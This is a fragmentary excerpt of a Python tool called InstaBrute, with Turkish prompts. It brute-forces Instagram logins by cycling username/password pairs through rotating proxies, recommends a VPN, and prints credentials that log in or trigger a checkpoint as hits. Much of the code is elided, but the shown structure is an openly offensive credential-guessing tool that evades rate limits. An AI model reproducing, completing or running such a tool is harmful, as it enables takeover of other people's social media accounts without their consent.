...
vpn kullanılmalıdır . lütfen bundan önce "proxy file" txt dosyasındaki proxyleri kullanın.      
''')
...
class InstaBrute(object):
    def __init__(self):
        ...
        try:
            ...
            self.CurrentProxy = ''
            self.UsedProxys = []
            UsePorxy = input('[*] proxy kullanmak ister misin (y/n): ').upper()
    ...
    def New_Br(self, user, pwd):
        ...
        with requests.Session() as s:
            ...
            if 'message' in r.text:
                ...
                print (whiteB_color + 'kullanıcıadı: '+ user + ' | '' şifre: '+ pwd )
                print(r.text)
                print('----------------------------')
            if 'checkpoint_url' in r.text:
                print((normal_color+'' + user + ':' + pwd + ' --> wouw nice shot '))
            ...
            if 'userId' in r.text:
                ...
                print (red_color + 'kullanıcıadı: '+ user + ' | '' şifre: '+ pwd )
                print(r.text)
